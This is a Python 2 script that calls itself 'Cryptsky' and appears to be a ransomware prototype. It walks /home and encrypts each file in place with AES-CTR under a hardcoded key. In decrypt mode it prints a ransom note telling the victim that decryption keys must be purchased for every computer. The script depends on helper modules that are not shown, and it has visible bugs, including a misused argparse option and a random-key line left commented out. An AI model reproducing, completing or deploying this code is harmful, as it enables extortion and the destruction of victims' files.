#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
from base64 import b64encode, b64decode
import argparse
import os

import walk
import modify

# argparse here
# -d, --decrypt = store true (decrypt or encrypt)
def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        type="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print '''
        Cryptsky!
        ---------------
        Your files have been encrypted. This is the part where I tell you how to pay and obtain the key.
        To identify which key belongs to this machine, so that you get the correct decryption key,
        a unique identifier has been created for you.

        your identifier is: 14765.

        Please provide this when asked.
        you will in turn be given a string of letters and numbers. Please type it in exactly.
        Capitalization is important, and typing it wrong will result in failed decryption of your files,
        destroying them forever. Decryption keys are specific to each computer and using a key on the
        wrong computer will also result in permanent loss of files. Please double check. Decryption keys
        must be purchased for every computer you wish to recover.

        '''
        key = b64decode(raw_input('Enter Your Key> '))

    else:
        key = 'yellow submarine'

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    startdir = '/home' # the directory to start in
    for file in walk.walking(startdir):
        modify.modify_file_inplace(file, crypt.encrypt)

    for _ in range(100):
        pass
        #key = random(32)

    if not decrypt:
        pass
         # post encrypt stuff
         # desktop picture
         # icon, etc

if __name__=="__main__":
    main()
